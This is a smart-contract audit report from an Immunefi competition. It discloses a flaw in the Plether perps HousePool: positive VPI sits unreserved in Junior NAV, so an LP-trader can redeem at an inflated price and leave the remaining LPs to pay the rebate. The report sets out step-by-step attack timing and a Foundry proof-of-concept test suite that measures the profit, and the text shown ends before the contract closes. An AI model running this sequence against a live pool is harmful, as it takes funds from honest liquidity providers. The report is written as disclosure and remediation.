# \#97823 [SC-Critical] Unreserved refundable positive VPI in Junior NAV lets an LP-trader redeem at an inflated price, taking unclaimed yield from honest Junior LPs

**Submitted on Nov 3rd 2026 at 12:59:14 UTC by @SwiftBotLabs for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97823
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief
Positive VPI paid on a skew-increasing open is booked straight into Junior NAV, but the position can get all of it back as a rebate at close. Nothing reserves against that refund. An LP who also trades can open a large position, redeem at the inflated NAV, then close and take the rebate from the LPs who stayed. At realistic oracle confidence the attacker nets +2,737 USDG per cycle and honest Junior LPs lose 4,330 USDG, on a $10M pool. The same trade with the exit after the rebate loses 2,011 USDG, which shows the timing is the whole edge.

## Vulnerability details
- Positive VPI is booked as LP revenue at once: `packages/perps/src/CfdEngineSettlementSidecar.sol:454-464`.
- Reconcile counts it with no refund liability: `libraries/HousePoolAccountingLib.sol:63`, `HousePool.sol:835`.
- Redemption is priced from that NAV: `HousePool.sol:840`.
- The clamp allows a refund of everything paid: `libraries/CloseAccountingLib.sol:116-118`.
- The rebate is paid from pool cash: `libraries/CfdEnginePlanLib.sol:973-978`.

The spec protects the opposite case: negative VPI is reserved so LPs cannot withdraw it as marked equity (`SECURITY.md:297-298`, the `vpiRebateReserve`). Positive VPI has no equivalent. `SECURITY.md:859` says new LPs "do not inherit old trader obligations at a higher deposit NAV", and here the remaining LPs do inherit one.

## Attack
1. Hold Junior shares past the 1-hour cooldown and call `requestRedeem` before the 5-minute cutoff.
2. In the quiet period, about 16 seconds before the boundary, open a large skew-increasing position. Its VPI lifts Junior NAV at once.
3. After the epoch boundary call `Router.settleLpEpoch`. The redemption is priced at the inflated NAV.
4. Commit the close after settlement, not before, and close. The rebate is paid by the remaining LPs.
5. Re-deposit and repeat. A full cycle takes 3 hours.

## Results
Release parameters from `DEPLOYMENT.md`, $10M pool, 50% Senior, attacker holds 75% of Junior, position 3.99M. Everyone is cashed out in USDG and compared with a same-timing no-trade baseline. Treasury receives about +1,595 in each row, and the three deltas sum to about zero. Senior is unaffected.

| Case | Attacker | Honest Junior |
|---|---|---|
| Confidence 0.30 bps, from the repo's Pyth fixtures | **+2,737** | **-4,330** |
| Confidence 1 bp | +2,650 | -4,242 |
| Confidence 10 bps, the oracle hard cap | +1,525 | -3,118 |
| Control: same trade, exit after the rebate | -2,011 | +461 |

Hand check of the first row: 5,967 - 3,192 - 37 = +2,738. Honest loss is not the whole VPI, because on a net-rebate close the pool keeps the close fee (`CfdEnginePlanLib.sol:1066`), which is why the treasury receives about 1,595.

Scale: a $50M pool gives +13,698 and -21,675 per cycle. Eight cycles in 24 hours at a 68% stake give +16,233 and -28,695. Honest Junior LPs end below their deposit.

## Preconditions and limits
Stated up front so they can be checked:
- Self-created skew needs about 41% of Junior (40% gives -57, 42% gives +102). With 3M of third-party skew it needs about 25%.
- Senior must be at or below about 70% of the pool, because of the covenant in `HousePoolSeniorCapacityLib.sol:87`. Near 80% Senior the exit is not funded.
- Live market only. The 75 bps frozen-market Junior exit fee stops it.
- Net profit tops out at about 0.028% of the pool per cycle.
- The open position carries mean-zero price risk for about two minutes.

The competition rules say a high capital requirement is generally not a reason to downgrade.

## Severity
High, Theft of unclaimed yield. The attacker profits, so this is not griefing. I did not lead with direct theft because each cycle's take is capped by the VPI paid, though honest Junior principal does end below deposit.

## Why this is not the known item
The closest published item is the scan's Info finding on temporary pool-liquidity reduction amplifying a skew-reducing close rebate. That item is about depth changing the curve, so the rebate exceeds what the curve permits. Here the rebate is capped at exactly what was paid and the profit comes from LP share price. `test_12_DepthNeutral_NoAmplification` shows this: depth at close is higher than at open ($10,014,036 against $10,002,000), so nothing is amplified, and the attacker still makes +2,659.

## Fix
Track the sum of `max(vpiAccrued, 0)` across open positions and treat it as a liability in `buildReconcileSnapshot` and in the withdrawal reserve, releasing it to LPs only when the position closes or is liquidated. I have not tested this fix.

## Proof of Concept

## Steps to reproduce (attack)
1. Hold Junior shares past the 1-hour cooldown and call `requestRedeem` before the 5-minute cutoff.
2. In the quiet period, about 16 seconds before the boundary, open a large skew-increasing position. Its VPI lifts Junior NAV at once.
3. After the epoch boundary call `Router.settleLpEpoch`. The redemption is priced at the inflated NAV.
4. Commit the close after settlement, not before, and close. The rebate is paid by the remaining LPs.
5. Re-deposit and repeat. A full cycle takes 3 hours.

## Proof of concept
Add `packages/perps/test/perps/poc/VpiNavExitReview.t.sol` (full file below) and run:

```
forge test --root packages/perps --match-path 'test/perps/poc/VpiNavExitReview.t.sol' -vv
```

18 tests pass. Key tests: `test_02_Conf_Real_0p30bps`, `test_04_Conf_Max_10bps`, `test_12_DepthNeutral_NoAmplification`, `test_14_Control_SameTrade_ExitAfterRebate`, `test_16_Day_EightCycles`. The test adapter maps a scalar commit onto the production V3 commit. Only Pyth and USDG are mocked. Run with forge 1.8.5 and solc 0.8.35.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Independent adversarial re-measurement of the VPI / Junior NAV exit claim.
/// @dev Differences from VpiNavExit.t.sol: release oracle multiplier installed through the real timelock, nonzero Pyth
///      confidence (basket values derived from the repo's captured Pyth fixtures), every actor cashed out in real
///      USDG rather than valued through a view, treasury included so value is conserved, and sweeps over stake,
///      Senior share, price path and depth.
contract VpiNavExitReview is BasePerpTest {

    address internal constant A_LP = address(0xA11);
    address internal constant A_TRADER = address(0xA22);
    address internal constant HONEST = address(0xB0B);
    address internal constant SENIOR_LP = address(0x5E);
    address internal constant BYSTANDER = address(0xB1);
    address internal constant FRESH_LP = address(0xF5);

    uint64 internal constant CONF_ZERO = 0;
    /// @dev 0.30 bps of a 1e8 basket. Weighted from deployments/releases/*/activation-pyth-fixture.json.
    uint64 internal constant CONF_REAL = 3_000;
    uint64 internal constant CONF_1BP = 10_000;
    /// @dev Exactly basketMaxConfidenceRatioBps (10 bps): the widest basket the oracle accepts.
    uint64 internal constant CONF_MAX = 100_000;

    uint256 internal constant TRADER_FUNDING = 100_000e6;
    uint256 internal constant TRADER_MARGIN = 30_000e6;

    struct Run {
        uint256 senior;
        uint256 honestJ;
        uint256 attackerJ;
        uint256 size;
        uint64 conf;
        int256 moveBpsE2BeforeSettle; // price move between open and settle, in 0.01 bps
        int256 moveBpsE2BeforeClose; // further price move between settle and close, in 0.01 bps
        bool trade;
        uint256 naturalSkew; // third-party same-side position left open for the whole run, then closed
        uint256 traderFunding; // 0 = TRADER_FUNDING
        uint256 traderMargin; // 0 = TRADER_MARGIN
        bool expectFullExit; // revert the run if the attacker's redemption is not fully funded at the attack epoch
    }

    struct Out {
        int256 attacker;
        int256 honest;
        int256 senior;
        int256 treasury;
        int256 bystander;
        uint256 vpiPaid;
        uint256 lpFundedShares;
        uint256 lpRequestedShares;
    }

    // Execution-price feed with explicit confidence. Same shape as BasePerpTest._mockPythUpdateData.
    function _pyth(
        uint256 price,
        uint64 conf
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            conf,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Release values through the production timelocks, not storage writes.
    function _applyReleaseConfig() internal {
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1_000e6;
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release multiplier installed");
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10, "release confidence cap");
    }

    function _px(
        int256 moveBpsE2
    ) internal pure returns (uint256) {
        return uint256(int256(1e8) + (int256(1e8) * moveBpsE2) / 1_000_000);
    }

    function _open(
        address trader,
        uint256 size,
        uint256 margin,
        uint64 conf
    ) internal {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, size, margin, 0.9e8, false);
        bytes[] memory data = _pyth(1e8, conf);
        vm.prank(trader);
        router.executeOrder(orderId, data);
        (uint256 positionSize,,,,,,) = engine.positions(trader);
        assertGt(positionSize, 0, "open filled");
    }

    function _close(
        address trader,
        uint256 price,
        uint64 conf
    ) internal {
        (uint256 size,,,,,,) = engine.positions(trader);
        vm.prank(trader);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 2e8, true);
        bytes[] memory data = _pyth(price, conf);
        vm.prank(trader);
        router.executeOrder(orderId, data);
        (uint256 positionSize,,,,,,) = engine.positions(trader);
        assertEq(positionSize, 0, "close filled");
    }

    /// @dev Real token cash: withdraws the trader's whole clearinghouse balance to its wallet.
    function _withdrawTrader(
        address trader
    ) internal {
        uint256 free = clearinghouse.balanceAssets(trader);
        if (free == 0) {
            return;
        }
        vm.prank(trader);
        clearinghouse.withdraw(trader, free);
    }

    function _redeemAll(
        address owner,
        bool senior
    ) internal returns (uint256 requestId, uint256 shares) {
        shares = (senior ? seniorVault : juniorVault).balanceOf(owner);
        vm.prank(owner);
        requestId = (senior ? seniorVault : juniorVault).requestRedeem(shares, owner, owner);
    }

    function _claimAll(
        address owner,
        uint256 requestId,
        bool senior
    ) internal {
        uint256 shares = (senior ? seniorVault : juniorVault).claimableRedeemRequest(requestId, owner);
        if (shares == 0) {
            return;
        }
        vm.prank(owner);
        (senior ? seniorVault : juniorVault).claimRedeem(requestId, shares, owner, owner);
    }

    function _funding(
        Run memory r
    ) internal pure returns (uint256) {
        return r.traderFunding == 0 ? TRADER_FUNDING : r.traderFunding;
    }

    function _seed(
        Run memory r
    ) internal {
        _applyReleaseConfig();
        if (r.honestJ > 0) {
            _fundJunior(HONEST, r.honestJ);
        }
        _fundJunior(A_LP, r.attackerJ);
        _fundSenior(SENIOR_LP, r.senior);
        _fundTrader(A_TRADER, _funding(r));
        if (r.naturalSkew > 0) {
            _fundTrader(BYSTANDER, 400_000e6);
        }
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) + 60);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        if (r.naturalSkew > 0) {
            _open(BYSTANDER, r.naturalSkew, 150_000e6, r.conf);
        }
    }

    /// @dev Full lifecycle ending with every non-seed actor flat, in USDG, in its own wallet.
    function _run(
        Run memory r
    ) internal returns (Out memory o) {
        _seed(r);

        (uint256 requestId, uint256 requestedShares) = _redeemAll(A_LP, false);
        o.lpRequestedShares = requestedShares;

        vm.warp(pool.lpEpochStart(requestId) - 120);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        if (r.trade) {
            _open(A_TRADER, r.size, r.traderMargin == 0 ? TRADER_MARGIN : r.traderMargin, r.conf);
            (,,,,,, int256 vpiAccrued) = engine.positions(A_TRADER);
            o.vpiPaid = uint256(vpiAccrued);
        }

        vm.warp(pool.lpEpochStart(requestId) + 1);
        router.settleLpEpoch(_pyth(_px(r.moveBpsE2BeforeSettle), r.conf));
        o.lpFundedShares = juniorVault.claimableRedeemRequest(requestId, A_LP);
        if (r.expectFullExit) {
            assertEq(o.lpFundedShares, requestedShares, "attacker redemption fully funded at the attack epoch");
        }
        _claimAll(A_LP, requestId, false);

        if (r.trade) {
            router.updateMarkPrice(_pyth(_px(r.moveBpsE2BeforeSettle + r.moveBpsE2BeforeClose), r.conf));
            _close(A_TRADER, _px(r.moveBpsE2BeforeSettle + r.moveBpsE2BeforeClose), r.conf);
        }
        if (r.naturalSkew > 0) {
            _close(BYSTANDER, _px(r.moveBpsE2BeforeSettle + r.moveBpsE2BeforeClose), r.conf);
            _withdrawTrader(BYSTANDER);
        }
        _withdrawTrader(A_TRADER);

        // Cash out Senior and honest Junior in one epoch so the Junior covenant cannot trap the measurement.
        uint256 seniorRequest;
        uint256 honestRequest;
        (seniorRequest,) = _redeemAll(SENIOR_LP, true);
        if (r.honestJ > 0) {
            (honestRequest,) = _redeemAll(HONEST, false);
        }
        vm.warp(pool.lpEpochStart(seniorRequest) + 1);
        router.updateMarkPrice(_pyth(_px(r.moveBpsE2BeforeSettle + r.moveBpsE2BeforeClose), r.conf));
        router.settleLpEpoch(_pyth(_px(r.moveBpsE2BeforeSettle + r.moveBpsE2BeforeClose), r.conf));
        _claimAll(SENIOR_LP, seniorRequest, true);
        _claimAll(A_LP, requestId, false); // any residue funded only after Senior left
        if (r.honestJ > 0) {
            _claimAll(HONEST, honestRequest, false);
            uint256 honestLeft = juniorVault.claimableRedeemRequest(honestRequest, HONEST);
            assertEq(honestLeft, 0, "honest claim drained");
            assertGt(settlementToken.balanceOf(HONEST), (r.honestJ * 9) / 10, "honest actually cashed out");
        }

        o.attacker = int256(settlementToken.balanceOf(A_LP)) + int256(settlementToken.balanceOf(A_TRADER))
            - int256(r.attackerJ) - int256(_funding(r));
        o.honest = int256(settlementToken.balanceOf(HONEST)) - int256(r.honestJ);
        o.senior = int256(settlementToken.balanceOf(SENIOR_LP)) - int256(r.senior);
        o.treasury = int256(clearinghouse.balanceAssets(engine.protocolTreasury()));
        if (r.naturalSkew > 0) {
            o.bystander = int256(settlementToken.balanceOf(BYSTANDER)) - int256(400_000e6);
        }
    }

    function _usd(
        int256 atoms
    ) internal pure returns (int256) {
        return atoms / 1e6;
    }

    function _print(
        string memory label,
        Out memory base,
        Out memory atk
    ) internal pure {
        console2.log(label);
        console2.log("    VPI paid on open        ", atk.vpiPaid / 1e6);
        console2.log("    attacker net vs baseline", _usd(atk.attacker - base.attacker));
        console2.log("    honest   net vs baseline", _usd(atk.honest - base.honest));
        console2.log("    senior   net vs baseline", _usd(atk.senior - base.senior));
        console2.log("    treasury net vs baseline", _usd(atk.treasury - base.treasury));
        console2.log("    attacker absolute P&L   ", _usd(atk.attacker));
    }

    function _pair(
        Run memory r
    ) internal returns (Out memory base, Out memory atk) {
        uint256 snap = vm.snapshotState();
        r.trade = false;
        base = _run(r);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        r.trade = true;
        atk = _run(r);
        vm.revertToState(snap);
    }

    function _std(
        uint64 conf
    ) internal pure returns (Run memory r) {
        r.senior = 5_000_000e6;
        r.honestJ = 1_250_000e6;
        r.attackerJ = 3_750_000e6;
        r.size = 3_990_000e18;
        r.conf = conf;
        r.expectFullExit = true;
    }

    // ---------------------------------------------------------------------
    // 1. Realistic confidence, release multiplier, cash measurement.
    // ---------------------------------------------------------------------

    function test_01_Conf_Zero_Reproduction() public {
        (Out memory base, Out memory atk) = _pair(_std(CONF_ZERO));
        _print("conf 0 (the PoC assumption)", base, atk);
        assertGt(atk.attacker, base.attacker, "reproduces");
    }

    function test_02_Conf_Real_0p30bps() public {
        (Out memory base, Out memory atk) = _pair(_std(CONF_REAL));
        _print("conf 0.30 bps (captured Pyth fixtures, weighted)", base, atk);
    }

    function test_03_Conf_1bp() public {
        (Out memory base, Out memory atk) = _pair(_std(CONF_1BP));
        _print("conf 1 bp", base, atk);
    }

    function test_04_Conf_Max_10bps() public {
        (Out memory base, Out memory atk) = _pair(_std(CONF_MAX));
        _print("conf 10 bps (oracle hard cap, worst case)", base, atk);
    }

    /// @dev Positive control: the shift must really reach the fill, or the sweep above proves nothing.
    function test_05_PositiveControl_ConfidenceReachesFill() public {
        Run memory r = _std(CONF_MAX);
        _seed(r);
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) - 120);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        _open(A_TRADER, r.size, TRADER_MARGIN, r.conf);
        (,, uint256 entryPrice,,,,) = engine.positions(A_TRADER);
        console2.log("entry price at 10 bps conf, mult 2500 (1e8 mark)", entryPrice);
        assertEq(entryPrice, 1e8 - 25_000, "LONG open filled 2.5 bps adverse");
    }

    // ---------------------------------------------------------------------
    // 2. Price path. Mean-zero risk, so show the spread, not a cost.
    // ---------------------------------------------------------------------

    function test_06_PricePathSensitivity() public {
        int256[5] memory moves = [int256(-1_500), -500, 0, 500, 1_500]; // -15, -5, 0, +5, +15 bps in 0.01 bps units
        for (uint256 i; i < moves.length; ++i) {
            Run memory r = _std(CONF_REAL);
            r.moveBpsE2BeforeSettle = moves[i] / 2;
            r.moveBpsE2BeforeClose = moves[i] / 2;
            (Out memory base, Out memory atk) = _pair(r);
            console2.log("total move, 0.01 bps", moves[i]);
            console2.log("    attacker net vs baseline", _usd(atk.attacker - base.attacker));
        }
    }

    // ---------------------------------------------------------------------
    // 3. Stake. Self-created skew at the 40% cap.
    // ---------------------------------------------------------------------

    function test_07_StakeSweep_SelfSkew() public {
        uint256[8] memory pct = [uint256(30), 35, 40, 42, 45, 50, 60, 75];
        for (uint256 i; i < pct.length; ++i) {
            Run memory r = _std(CONF_REAL);
            r.attackerJ = (5_000_000e6 * pct[i]) / 100;
            r.honestJ = 5_000_000e6 - r.attackerJ;
            (Out memory base, Out memory atk) = _pair(r);
            console2.log("attacker % of Junior", pct[i]);
            console2.log("    attacker net vs baseline", _usd(atk.attacker - base.attacker));
            console2.log("    honest   net vs baseline", _usd(atk.honest - base.honest));
        }
    }

    function test_08_StakeSweep_NaturalSkew3M() public {
        uint256[6] memory pct = [uint256(15), 20, 25, 30, 40, 60];
        for (uint256 i; i < pct.length; ++i) {
            Run memory r = _std(CONF_REAL);
            r.attackerJ = (5_000_000e6 * pct[i]) / 100;
            r.honestJ = 5_000_000e6 - r.attackerJ;
            r.size = 990_000e18;
            r.naturalSkew = 3_000_000e18;
            (Out memory base, Out memory atk) = _pair(r);
            console2.log("attacker % of Junior, 3M third-party skew", pct[i]);
            console2.log("    attacker net vs baseline", _usd(atk.attacker - base.attacker));
            console2.log("    honest   net vs baseline", _usd(atk.honest - base.honest));
        }
    }

    // ---------------------------------------------------------------------
    // 4. Senior covenant. How much Senior share leaves the attack open?
    // ---------------------------------------------------------------------

    function test_09_CovenantSweep() public {
        uint256[5] memory seniorPct = [uint256(50), 60, 65, 70, 75];
        for (uint256 i; i < seniorPct.length; ++i) {
            Run memory r = _std(CONF_REAL);
            r.senior = (10_000_000e6 * seniorPct[i]) / 100;
            uint256 junior = 10_000_000e6 - r.senior;
            // Largest stake the covenant can release: J_after >= S / 4, with a small margin for the coupon.
            uint256 releasable = junior - (r.senior * 2505) / 10_000;
            r.attackerJ = releasable;
            r.honestJ = junior - releasable;
            (Out memory base, Out memory atk) = _pair(r);
            console2.log("senior % of pool", seniorPct[i]);
            console2.log("    attacker % of Junior    ", (r.attackerJ * 100) / junior);
            console2.log("    attacker stake (USDG)   ", r.attackerJ / 1e6);
            console2.log("    attacker net vs baseline", _usd(atk.attacker - base.attacker));
            console2.log("    honest   net vs baseline", _usd(atk.honest - base.honest));
        }
    }

    /// @dev Near the release Senior limit (80%) Junior cannot leave, so the exit leg of the attack does not happen.
    function test_10_Covenant_NearEightyPercentSenior_NoExit() public {
        Run memory r = _std(CONF_REAL);
        r.expectFullExit = false;
        r.senior = 7_990_000e6;
        r.attackerJ = 1_500_000e6;
        r.honestJ = 510_000e6;
        r.size = 3_990_000e18;
        uint256 snap = vm.snapshotState();
        r.trade = true;
        Out memory o = _run(r);
        vm.revertToState(snap);
        console2.log("senior share 79.9%: bps of attacker shares funded", (o.lpFundedShares * 10_000) / o.lpRequestedShares);
        assertLt(o.lpFundedShares, o.lpRequestedShares / 50, "covenant blocks the exit");
    }

    // ---------------------------------------------------------------------
    // 5. Scale.
    // ---------------------------------------------------------------------

    function test_11_Scale_50M_Pool() public {
        Run memory r;
        r.senior = 25_000_000e6;
        r.honestJ = 6_250_000e6;
        r.attackerJ = 18_750_000e6;
        r.size = 19_950_000e18;
        r.conf = CONF_REAL;
        r.traderFunding = 500_000e6;
        r.traderMargin = 300_000e6;
        r.expectFullExit = true;
        (Out memory base, Out memory atk) = _pair(r);
        _print("50M pool, 75% of Junior", base, atk);
    }

    // ---------------------------------------------------------------------
    // 6. Isolation from the scan's depth-amplification item.
    // ---------------------------------------------------------------------

    /// @dev A fresh Junior deposit activates in the same settlement, so depth at close is NOT lower than at open.
    ///      Any profit here cannot come from reduced depth amplifying the rebate.
    function test_12_DepthNeutral_NoAmplification() public {
        Run memory r = _std(CONF_REAL);
        _seed(r);
        (uint256 requestId,) = _redeemAll(A_LP, false);

        uint256 freshAssets = 3_760_000e6;
        settlementToken.mint(FRESH_LP, freshAssets);
        vm.startPrank(FRESH_LP);
        settlementToken.approve(address(juniorVault), freshAssets);
        uint256 depositId = juniorVault.requestDeposit(freshAssets, FRESH_LP, FRESH_LP);
        vm.stopPrank();
        assertEq(depositId, requestId, "deposit activates in the redemption's epoch");

        vm.warp(pool.lpEpochStart(requestId) - 120);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        uint256 depthAtOpen = pool.totalAssets();
        _open(A_TRADER, r.size, TRADER_MARGIN, r.conf);
        (,,,,,, int256 vpiAccrued) = engine.positions(A_TRADER);

        vm.warp(pool.lpEpochStart(requestId) + 1);
        router.settleLpEpoch(_pyth(1e8, r.conf));
        _claimAll(A_LP, requestId, false);
        vm.prank(FRESH_LP);
        juniorVault.claimDepositShares(depositId);

        router.updateMarkPrice(_pyth(1e8, r.conf));
        uint256 depthAtClose = pool.totalAssets();
        console2.log("depth at open  (USDG)", depthAtOpen / 1e6);
        console2.log("depth at close (USDG)", depthAtClose / 1e6);
        assertGe(depthAtClose, depthAtOpen, "exit did not reduce depth");

        uint256 poolBefore = pool.totalAssets();
        _close(A_TRADER, 1e8, r.conf);
        uint256 poolAfter = pool.totalAssets();
        _withdrawTrader(A_TRADER);

        int256 attacker = int256(settlementToken.balanceOf(A_LP)) + int256(settlementToken.balanceOf(A_TRADER))
            - int256(r.attackerJ) - int256(TRADER_FUNDING);
        console2.log("VPI paid (USDG)            ", uint256(vpiAccrued) / 1e6);
        console2.log("pool outflow on close      ", (poolBefore - poolAfter) / 1e6);
        console2.log("attacker absolute P&L      ", _usd(attacker));
        assertGt(attacker, 0, "profit with no depth reduction at close");
    }

    // ---------------------------------------------------------------------
    // 7. Passive variant: no attacker trade at all.
    // ---------------------------------------------------------------------

    function test_13_Passive_LpExitsBeforeThirdPartyRebate() public {
        // Third party opens, LP exits, third party closes. The exiter never trades.
        Run memory r = _std(CONF_REAL);
        r.trade = false;
        r.naturalSkew = 3_990_000e18;
        uint256 snap = vm.snapshotState();
        Out memory early = _run(r);
        vm.revertToState(snap);

        // Control: the same third-party round trip completes first, then the LP exits.
        _seed(r);
        _close(BYSTANDER, 1e8, r.conf);
        _withdrawTrader(BYSTANDER);
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch()) + 60);
        (uint256 requestId,) = _redeemAll(A_LP, false);
        (uint256 seniorRequest,) = _redeemAll(SENIOR_LP, true);
        (uint256 honestRequest,) = _redeemAll(HONEST, false);
        vm.warp(pool.lpEpochStart(requestId) + 1);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        router.settleLpEpoch(_pyth(1e8, r.conf));
        _claimAll(A_LP, requestId, false);
        _claimAll(SENIOR_LP, seniorRequest, true);
        _claimAll(HONEST, honestRequest, false);
        int256 lateAttacker = int256(settlementToken.balanceOf(A_LP)) - int256(r.attackerJ);
        int256 lateHonest = int256(settlementToken.balanceOf(HONEST)) - int256(r.honestJ);

        console2.log("exit before third-party close: LP P&L  ", _usd(early.attacker));
        console2.log("exit before third-party close: honest  ", _usd(early.honest));
        console2.log("exit after  third-party close: LP P&L  ", _usd(lateAttacker));
        console2.log("exit after  third-party close: honest  ", _usd(lateHonest));
    }

    // ---------------------------------------------------------------------
    // 8. Active control at realistic settings.
    // ---------------------------------------------------------------------

    /// @notice Positive control: identical trade and stake, but the LP exits after the rebate. Timing is the only change.
    function test_14_Control_SameTrade_ExitAfterRebate() public {
        Run memory r = _std(CONF_REAL);
        uint256 snap = vm.snapshotState();
        r.trade = false;
        Out memory base = _run(r);
        vm.revertToState(snap);

        _seed(r);
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) - 120);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        _open(A_TRADER, r.size, TRADER_MARGIN, r.conf);
        _close(A_TRADER, 1e8, r.conf);
        _withdrawTrader(A_TRADER);
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch()) + 60);
        (uint256 requestId,) = _redeemAll(A_LP, false);
        (uint256 seniorRequest,) = _redeemAll(SENIOR_LP, true);
        (uint256 honestRequest,) = _redeemAll(HONEST, false);
        vm.warp(pool.lpEpochStart(requestId) + 1);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        router.settleLpEpoch(_pyth(1e8, r.conf));
        _claimAll(A_LP, requestId, false);
        _claimAll(SENIOR_LP, seniorRequest, true);
        _claimAll(HONEST, honestRequest, false);
        int256 attacker = int256(settlementToken.balanceOf(A_LP)) + int256(settlementToken.balanceOf(A_TRADER))
            - int256(r.attackerJ) - int256(TRADER_FUNDING);
        int256 honest = int256(settlementToken.balanceOf(HONEST)) - int256(r.honestJ);
        console2.log("control attacker net vs baseline", _usd(attacker - base.attacker));
        console2.log("control honest   net vs baseline", _usd(honest - base.honest));
        assertLt(attacker, base.attacker, "without the timing the round trip loses money");
    }

    // ---------------------------------------------------------------------
    // 9. Stake under a heavier Senior tranche with third-party skew.
    // ---------------------------------------------------------------------

    function test_15_StakeSweep_Senior70_NaturalSkew() public {
        uint256[4] memory pct = [uint256(20), 25, 30, 40];
        for (uint256 i; i < pct.length; ++i) {
            Run memory r = _std(CONF_REAL);
            r.senior = 7_000_000e6;
            r.attackerJ = (3_000_000e6 * pct[i]) / 100;
            r.honestJ = 3_000_000e6 - r.attackerJ;
            r.size = 990_000e18;
            r.naturalSkew = 3_000_000e18;
            (Out memory base, Out memory atk) = _pair(r);
            console2.log("senior 70%, 3M third-party skew, attacker % of Junior", pct[i]);
            console2.log("    attacker stake (USDG)   ", r.attackerJ / 1e6);
            console2.log("    attacker net vs baseline", _usd(atk.attacker - base.attacker));
            console2.log("    honest   net vs baseline", _usd(atk.honest - base.honest));
        }
    }

    // ---------------------------------------------------------------------
    // 10. Eight three-epoch cycles (24 h), cash-settled, realistic confidence.
    // ---------------------------------------------------------------------

    function _day(
        bool trade
    ) internal returns (int256 attacker, int256 honest) {
        Run memory r = _std(CONF_REAL);
        r.honestJ = 1_600_000e6;
        r.attackerJ = 3_400_000e6;
        _seed(r);
        for (uint256 cycle; cycle < 8; ++cycle) {
            (uint256 requestId, uint256 shares) = _redeemAll(A_LP, false);
            vm.warp(pool.lpEpochStart(requestId) - 120);
            router.updateMarkPrice(_pyth(1e8, r.conf));
            if (trade) {
                _open(A_TRADER, 3_900_000e18, TRADER_MARGIN, r.conf);
            }
            vm.warp(pool.lpEpochStart(requestId) + 1);
            router.settleLpEpoch(_pyth(1e8, r.conf));
            assertEq(juniorVault.claimableRedeemRequest(requestId, A_LP), shares, "fully funded every cycle");
            _claimAll(A_LP, requestId, false);
            if (trade) {
                router.updateMarkPrice(_pyth(1e8, r.conf));
                _close(A_TRADER, 1e8, r.conf);
            }
            if (cycle == 7) {
                break;
            }
            uint256 assets = settlementToken.balanceOf(A_LP);
            vm.startPrank(A_LP);
            settlementToken.approve(address(juniorVault), assets);
            uint256 depositId = juniorVault.requestDeposit(assets, A_LP, A_LP);
            vm.stopPrank();
            vm.warp(pool.lpEpochStart(depositId) + 1);
            router.settleLpEpoch(_pyth(1e8, r.conf));
            vm.prank(A_LP);
            juniorVault.claimDepositShares(depositId);
            vm.warp(pool.lpEpochStart(depositId) + 1 hours + 60);
        }
        _withdrawTrader(A_TRADER);
        (uint256 seniorRequest,) = _redeemAll(SENIOR_LP, true);
        (uint256 honestRequest,) = _redeemAll(HONEST, false);
        vm.warp(pool.lpEpochStart(seniorRequest) + 1);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        router.settleLpEpoch(_pyth(1e8, r.conf));
        _claimAll(SENIOR_LP, seniorRequest, true);
        _claimAll(HONEST, honestRequest, false);
        attacker = int256(settlementToken.balanceOf(A_LP)) + int256(settlementToken.balanceOf(A_TRADER))
            - int256(r.attackerJ) - int256(TRADER_FUNDING);
        honest = int256(settlementToken.balanceOf(HONEST)) - int256(r.honestJ);
    }

